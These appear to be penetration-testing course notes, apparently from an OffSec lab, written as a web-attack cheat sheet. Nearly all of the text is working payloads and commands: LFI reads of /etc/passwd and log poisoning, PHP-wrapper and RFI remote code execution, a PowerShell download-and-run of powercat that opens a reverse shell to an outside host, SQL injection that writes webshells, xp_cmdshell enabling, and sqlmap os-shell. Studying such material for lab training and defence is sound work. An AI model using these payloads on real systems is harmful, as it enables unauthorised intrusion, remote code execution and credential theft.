
Fuzzing properly:
`gobuster dir -u http://172.16.136.30/ -w /usr/share/dirb/wordlists/big.txt -t 200 -x .aspx,.php,.jsp,.html,.js`

### Enumerating and Abusing APIs
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
```text
pattern.txt

{GOBUSTER}/v1
{GOBUSTER}/v2
```

### Cross-Site Scripting
> **Special characters:** 
> * `< > ' " { } ;`

### Directory Traversal / File Inclusion (LFI/RFI) / Log Poisoning
> **Notes:**
> * Use curl to get better formatting
> * If we retrieve the passwd file, try to retrieve `id_rsa` files
> * Encode characters if needed
> * Check for log poisoning in **Apache** servers

| **Files to try** | **Description** |
| ---- | ---- |
| `/index.php?page=../../../../etc/passwd` | Linux |
| `/index.php?page=../../../../Windows/System32/drivers/etc/hosts` | Windows 1 |
| `/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts` | Windows 2 |
| `/index.php?page=../../../../var/log/apache2/access.log` | Apache (log poisoning) |
| `/index.php?page=../../../../xampp/apache/logs/access.log` | Apache (log poisoning) in XAMP 1 |
| `/index.php?page=..\..\..\..\xampp\apache\logs\access.log` | Apache (log poisoning) in XAMP 2 |

If we retrieve Apache access log, insert php code in the User-Agent header of the original request to trigger Log Poisoning vulnerability, then you can see the command output in the log file

> [!warning] Do no forget to try both Linux and Windows commands in log poisoning execution

![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/commonwebattacks/a5768a72a99581707edad7a81a481e3a-cwa_lfi_modfirstreqcom.png)

| **PHP Wrappers** | **Description** |
| ---- | ---- |
| `/index.php?page=php://filter/resource=admin.php` | Get resource |
| `/index.php?page=php://filter/convert.base64-encode/resource=admin.php` | Get b64 encoded resource |
| `curl "http://host.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"` | RCE through wrappers |
| `curl "http://host.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"` | RCE through wrappers (b64 encoded) |
| `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"` | RCE through RFI |

### File Upload
> **Notes:**
> * If `.asp` or `.aspx` are allowed upload a webshell as **[p0wny shell](https://github.com/flozz/p0wny-shell)**
> * If `.php` file is not allowed try:
> 	* `.pHP`
> 	* `.phps`
> 	* `.php7`
> 	* `.phtml`
> 	* `.phar`

If we can upload a file and include `../` in the file name, maybe we can overwrite the **authorized_keys**:

```bash
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```

![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/commonwebattacks/999ddab4c6543dc3d727618bc14ed495-cwa_fu_burprelsshcom.png)

SSH can throw an error if it cannot verify the host key it saved previously. If this happen, remove `~/.ssh/known_hosts`

```bash
kali@kali:~$ rm ~/.ssh/known_hosts

kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host [mountaindesserts.com]:2222 ([192.168.50.16]:2222) cant be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

### Command Injection
| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
| ---- | ---- | ---- | ---- |
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `\|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `\|\|` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ` `` ` | `%60%60` | Both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |

Snippet to detect CMD or Powershell in Windows systems

```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

If Powershell is available, we can use powercat.ps1 (Powercat is a PowerShell implementation of Netcat included in Kali) and python server

```shell
Command to trigger:
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 

Command injection:
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

### SQL Injection Attacks

> **Notes:**
> * Union-based payloads has to include the same number of columns as the original query and the data types need to be compatible between each column
> * **Useful Info to retrieve:**
> 	* `@version / database() / user()`
> 	* `SELECT table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema=database()`
> * We can specify php code in a Union-based SQLi and output to a file, then trigger it to gain RCE

| **Payloads** | **Description** |
| ---- | ---- |
| `'` | Special characters. If any of them throws an error could mean SQL Injection is possible |
| `' OR 1=1 -- //` | Basic injection |
| `' AND 1=1 -- //` | **Boolean-based** SQLi. Since _1=1_ will always be TRUE, the application will return the values only if the user (or whatever field we have filled) is present in the database |
| `' AND IF (1=1, sleep(3),'false') -- //` | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent |
| **Error-based payloads** | **Description** |
| `' or 1=1 in (select @@version) -- //` | If it returns the version, querying the database interactively is possible, so we can run queries like this. If we receive an error specifying the number of columns we can filter the query to return just one column |
| `' or 1=1 in (select table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema=database()) -- //` | Query db info |
| `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //` | Example query |
| **Union-based payloads** | **Description** |
| `' ORDER BY 1-- //` | To discover the number of columns. It will order the results by a specific column, meaning it will fail whenever the selected column does not exist |
| `%' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database()  -- //` | Query db info |
| `%' UNION SELECT null, password, null FROM users  -- //` | Example query |
| `%' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //` | Write a shell in root folder |
| **Blind payloads** | **Description** |
| `' AND IF (1=1, sleep(3),'false') -- //` | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent |
| `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //` | Write a shell in root folder |


Enable code execution in MSSQL (`xp_cmdshell`):

```bash
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
root
```

Write a shell into a file in the server:

```bash
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

We can get an error with the above payload but the error is related to the incorrect return type, and should not impact writing the webshell on disk.

| **SQLMap** | **Description** |
| ---- | ---- |
| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user` | Specify parameter user and use 1 as dummy value |
| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump` | Dump the entire database |
| `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --os-shell` | Gives us a fully interactive shell |
| `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"` | Writes a shell in specified server folder by using a request file (POST request via Burp and saved it as a local text file), and returns a fully interactive shell |

### HTTP Verb Tampering

`HTTP Method`
- `HEAD`
- `PUT`
- `DELETE`
- `OPTIONS`
- `PATCH`

| **Command** | **Description** |
| ---- | ---- |
| `-X OPTIONS` | Set HTTP Method with Curl |
